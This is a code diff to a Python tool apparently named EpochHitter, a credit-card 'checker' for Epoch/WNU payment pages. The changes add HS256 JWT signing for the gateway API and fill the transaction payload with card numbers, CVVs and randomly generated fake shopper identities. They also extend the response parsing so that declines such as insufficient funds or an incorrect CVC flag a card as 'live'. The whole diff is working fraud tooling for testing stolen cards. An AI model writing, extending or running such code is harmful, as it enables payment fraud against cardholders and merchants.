@@ -9,12 +9,31 @@ import re
 import json
 import time
 import random
+import hmac
+import hashlib
+import base64
 import urllib.parse
 from typing import Dict, Optional, Tuple
 from urllib.parse import urljoin, urlparse, parse_qs
 from curl_compat import ChromeSession
 
 UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+
+def _jwt_sign(payload: dict, secret: str) -> str:
+    """Generates standard HS256 JWT string for Epoch/WNU signed API authentication."""
+    header = {"alg": "HS256", "typ": "JWT"}
+    
+    def b64url(data_bytes: bytes) -> str:
+        return base64.urlsafe_b64encode(data_bytes).decode('utf-8').rstrip('=')
+    
+    h_b64 = b64url(json.dumps(header, separators=(',', ':')).encode('utf-8'))
+    p_b64 = b64url(json.dumps(payload, separators=(',', ':')).encode('utf-8'))
+    
+    signing_input = f"{h_b64}.{p_b64}".encode('utf-8')
+    sig = hmac.new(secret.encode('utf-8'), signing_input, hashlib.sha256).digest()
+    sig_b64 = b64url(sig)
+    
+    return f"{h_b64}.{p_b64}.{sig_b64}"
 
 def _generate_random_shopper(country_code: str = 'US') -> dict:
     FIRST_NAMES = ['James', 'Michael', 'Robert', 'John', 'David', 'William', 'Richard', 'Joseph', 'Thomas', 'Charles', 'Christopher', 'Daniel', 'Matthew', 'Anthony', 'Mark', 'Steven', 'Paul', 'Andrew', 'Joshua', 'Sarah', 'Emily', 'Emma', 'Olivia', 'Sophia', 'Isabella', 'Ava', 'Mia', 'Charlotte', 'Amelia']
@@ -170,11 +189,23 @@ class EpochHitter:
         return self._base_cfg.copy()
 
     def _parse_response(self, html: str, status_code: int, result: dict) -> dict:
-        """Parses Epoch response page/JSON for approval or decline details."""
+        """Parses Epoch / WNU response page/JSON for approval or decline details."""
         # Try JSON parsing first
         try:
             d = json.loads(html)
-            if isinstance(d, dict):
+            if isinstance(d, list) and len(d) > 0:
+                item = d[0]
+                result['raw_response'] = d
+                if item.get('isApproved') is True or item.get('status') is True:
+                    result['success'] = True
+                    result['receipt_url'] = item.get('url') or item.get('receipt_url') or self.url
+                    return result
+                err_code = item.get('error') or item.get('message') or 'card_declined'
+                result['decline_code'] = 'card_declined'
+                result['error'] = err_code
+                result['is_live'] = err_code in ['insufficient_funds', 'incorrect_cvc', '3ds_required', 'restricted_card', 'issuer_unavailable']
+                return result
+            elif isinstance(d, dict):
                 result['raw_response'] = d
                 msg = d.get('message') or d.get('error') or d.get('status') or ''
                 if d.get('status') is True or d.get('isApproved') is True or d.get('status') == 'Succeeded':
@@ -275,9 +306,33 @@ class EpochHitter:
 
                 # 1. Modern WNU / Epoch v4 JWT API flow
                 if cfg.get('token') and (cfg.get('cacheKey') or 'wnu.com' in self.url.lower()):
+                    c_key = cfg.get('cacheKey') or parse_qs(urlparse(self.url).query).get('cacheKey', [''])[0]
+                    s_id = cfg.get('sessionID') or parse_qs(urlparse(self.url).query).get('sessionID', [''])[0]
+                    
                     tx_payload = {
-                        "cacheKey": cfg.get('cacheKey') or parse_qs(urlparse(self.url).query).get('cacheKey', [''])[0],
-                        "sessionID": cfg.get('sessionID') or parse_qs(urlparse(self.url).query).get('sessionID', [''])[0],
+                        "cacheKey": c_key,
+                        "sessionID": s_id,
+                        "invoiceID": c_key,
+                        "purchaseID": "1",
+                        "purchaseItemID": "1",
+                        "siteID": "1",
+                        "productCode": "1",
+                        "currencyCode": cfg.get('currency', 'USD'),
+                        "countryCode": shopper.get('country', 'US'),
+                        "submitCount": 1,
+                        "paymentType": "CreditDebitCard",
+                        "redirectType": "CreditDebitCard",
+                        "fullName": shopper['full_name'],
+                        "name_on_card": shopper['full_name'],
+                        "first_name": shopper['first_name'],
+                        "last_name": shopper['last_name'],
+                        "email": shopper['email'],
+                        "postalCode": shopper['postal_code'],
+                        "zip": shopper['postal_code'],
+                        "city": shopper['city'],
+                        "state": shopper['state'],
+                        "street": shopper['street'],
+                        "cardNumber": card['card'],
                         "card_number": card['card'],
                         "card_number_1": card['card'],
                         "cardNum": card['card'],
@@ -286,23 +341,11 @@ class EpochHitter:
                         "expire_year": yr_short,
                         "cvv2": card['cvv'],
                         "cvv": card['cvv'],
-                        "name_on_card": shopper['full_name'],
-                        "fullName": shopper['full_name'],
-                        "first_name": shopper['first_name'],
-                        "last_name": shopper['last_name'],
-                        "email": shopper['email'],
-                        "street": shopper['street'],
-                        "city": shopper['city'],
-                        "state": shopper['state'],
-                        "zip": shopper['postal_code'],
-                        "postalCode": shopper['postal_code'],
-                        "countryCode": shopper.get('country', 'US'),
-                        "country": shopper.get('country', 'US'),
-                        "currencyCode": cfg.get('currency', 'USD'),
-                        "productCode": cfg.get('product_id', '1'),
-                        "submitCount": 1,
-                        "paymentType": "CreditDebitCard",
-                        "redirectType": "CreditDebitCard"
+                        "card": {
+                            "cardNumber": card['card'],
+                            "cardExpiration": f"{card['month'].zfill(2)}/{yr_short}",
+                            "cvv2": card['cvv']
+                        }
                     }
                     jwt_token = _jwt_sign(tx_payload, cfg['token'])
                     jwt_hdr = {
